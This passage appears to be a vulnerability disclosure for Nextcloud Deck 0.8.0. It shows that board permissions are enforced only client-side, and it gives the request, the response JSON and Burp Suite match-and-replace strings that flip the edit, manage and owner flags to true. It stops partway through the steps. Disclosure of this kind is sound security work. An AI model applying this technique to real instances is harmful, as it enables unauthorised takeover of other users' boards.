Available functionality within each of the shared boards depends whether the user has received share, manage, edit permissions. \n\nSince the access control rules related to user’s permissions have only been applied on the client side and not on the server side, user can specify share/edit/manage permissions to be always true within the response (for example by using a proxy tool) when viewing board information. This way he can gain control over the board so he/she could apply the missing edit/manage permissions to him/herself directly from the UI.\n\n**Version information**:\nNextcloud 18.0.2\nDeck 0.8.0 enabled\n\n**Pre-requisites as an admin user to follow the vulnerable path**:\n- create 2 regular users in the next cloud, for example user silvia and user john.

Now authenticate in the application as john -\u003e click Deck from the menu and open the shared board “board for testing”. Since the board was only Shared and no edit permissions were granted, john cannot do much on the board. \n7. What john can do however is use a proxy tool such as Burp Suite to modify the response body. When john clicks on the Deck from the menu, following request is made:\n```\nGET /apps/deck/boards HTTP/1.1\nHost: next.yy.ee\n...\nConnection: close\nCookie: …\n```\n\n8. In the response to that request, you can see that john only been given the permission to share which only allows to read the data and not modify it.\n```\n[{\"title\":\"board for testing\",\n\"owner\":{\"primaryKey\":\"silvia\",\"uid\":\"silvia\",\"displayname\":\"silvia\"},\"color\":\"0082c9\",\"archived\":false,\"labels\":[],\"acl\":[{\"participant\":{\"primaryKey\":\"john\",\"uid\":\"john\",\"displayname\":\"john\"},\"type\":0,\"boardId\":7,\"permissionEdit\":false,\"permissionShare\":true,\"permissionManage\":false,\"owner\":false,\"id\":4}],\"permissions\":{\"PERMISSION_READ\":true,\"PERMISSION_EDIT\":false,\"PERMISSION_MANAGE\":false,\"PERMISSION_SHARE\":true},\"users\":[],\"shared\":1,\"stacks\":[],\"deletedAt\":0,\"lastModified\":1585045324,\"id\":7}]\n```\n\n9.  john however uses a proxy tool such as Burp Suite and applies via proxy -\u003e options -\u003e Match and replace that every time the following line with permissions is seen modify all the options to be equal to true.\nOriginal: `\"permissionEdit\":false,\"permissionShare\":true,\"permissionManage\":false,\"owner\":false`\nModified: `\"permissionEdit\":true,\"permissionShare\":true,\"permissionManage\":true,\"owner\":true`\n\n10.
